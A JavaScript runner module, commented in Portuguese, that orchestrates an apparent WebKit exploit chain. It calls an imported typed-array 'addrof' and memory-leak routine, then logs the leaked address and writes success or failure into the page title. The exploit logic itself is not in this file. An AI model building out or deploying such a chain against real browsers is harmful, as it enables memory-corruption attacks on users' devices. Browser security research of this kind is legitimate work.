// js/script3/runAllAdvancedTestsS3.mjs (ATUALIZADO para R44.2 - Teste OOB)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43, 
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT
} from './testArrayBufferVictimCrash.mjs';

async function runOOBMemScanStrategy_R44_2() {
    const FNAME_RUNNER = "runOOBMemScan_R44_2";
    logS3(`==== INICIANDO Estratégia OOB MemScan (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    
    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R43();
    const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;

    if (result && result.addrof_result && result.addrof_result.success) {
        const addrofResult = result.addrof_result;
        logS3(`  RUNNER: SUCESSO!`, "vuln", FNAME_RUNNER);
        logS3(`  RUNNER: Mensagem: ${addrofResult.msg}`, "good", FNAME_RUNNER);
        logS3(`  RUNNER: Endereço vazado (addrof): ${addrofResult.address}`, "leak", FNAME_RUNNER);
        document.title = `${module_name_for_title}: ADDROF SUCCESS!`;
    } else {
        const errorMsg = result ? result.errorOccurred : "Resultado indefinido do exploit.";
        logS3(`  RUNNER: A cadeia de exploração falhou: ${errorMsg}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: FAIL`;
    }

    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(1000);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `OOB_MemScan_R44_2_MainOrchestrator`;
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    
    await runOOBMemScanStrategy_R44_2();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;
}
